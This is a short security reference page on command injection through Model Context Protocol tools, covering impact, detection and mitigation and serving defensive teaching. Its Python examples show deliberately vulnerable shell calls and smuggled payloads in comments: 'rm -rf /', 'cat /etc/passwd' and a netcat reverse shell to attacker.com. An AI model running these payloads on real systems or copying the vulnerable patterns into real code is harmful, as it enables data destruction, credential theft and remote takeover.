---
layout: default
title: "Command Injection"
permalink: /ttps/command-injection/command-injection/
nav_order: 1
parent: "Command & Code Injection"
grand_parent: "MCP Security TTPs"
---

# Command Injection

**Category**: Command & Code Injection  
**Severity**: Critical  

## Description

Execution of arbitrary system commands through unsanitized input passed to MCP tools, enabling attackers to execute unauthorized commands on the host system.

## Technical Details

### Attack Vector
- Unsanitized input passed to system commands
- Shell command execution through MCP tools
- Command concatenation vulnerabilities
- Parameter injection in system calls

### Common Techniques
- Shell metacharacter injection
- Command chaining with semicolons
- Pipe-based command injection
- Background process execution

## Impact

- **System Compromise**: Full system access through command execution
- **Data Theft**: Access to sensitive files and data
- **Privilege Escalation**: Execution of commands with elevated privileges
- **Lateral Movement**: Access to network resources and connected systems

## Detection Methods

### System Monitoring
- Monitor system call execution
- Track process spawning
- Detect unusual command patterns
- Analyze command line arguments

### Behavioral Analysis
- Monitor tool execution patterns
- Detect anomalous system interactions
- Track command execution frequency
- Analyze execution context

## Mitigation Strategies

### Input Validation
- Implement strict input sanitization
- Use input validation libraries
- Deploy parameter filtering
- Validate command arguments

### Execution Controls
- Use parameterized command execution
- Implement command allow-lists
- Deploy execution sandboxing
- Restrict system access

## Real-World Examples

### Example 1: Shell Metacharacter Injection
```python
def ping_host(hostname):
    # Vulnerable command execution
    result = os.system(f"ping -c 4 {hostname}")
    
    # Attack: hostname = "google.com; rm -rf /"
    # Executed: ping -c 4 google.com; rm -rf /
```

### Example 2: Command Chaining
```python
def list_files(directory):
    # Vulnerable directory listing
    output = subprocess.check_output(f"ls {directory}", shell=True)
    
    # Attack: directory = "/tmp && cat /etc/passwd"
    # Executed: ls /tmp && cat /etc/passwd
```

### Example 3: Background Process Injection
```python
def backup_file(filename):
    # Vulnerable backup command
    os.system(f"cp {filename} /backup/")
    
    # Attack: filename = "file.txt & nc attacker.com 4444 -e /bin/bash &"
    # Executed: cp file.txt /backup/ & nc attacker.com 4444 -e /bin/bash &
```

## References & Sources

- **Strobes Security** - "MCP and Its Critical Vulnerabilities"
- **Prompt Security** - "Top 10 MCP Security Risks You Need to Know"
- **Red Hat** - "Model Context Protocol (MCP): Understanding security risks and controls"
- **Simon Willison** - "Model Context Protocol has prompt injection security problems"
- **Structured MCP Threats** - Comprehensive threat landscape analysis

## Related TTPs

- [OS Command Injection](os-command-injection.md)
- [Shell Command Execution](shell-command-execution.md)
- [Code Injection](code-injection.md)

---

*Command injection represents one of the most critical vulnerabilities in MCP systems, enabling direct system compromise through arbitrary command execution.*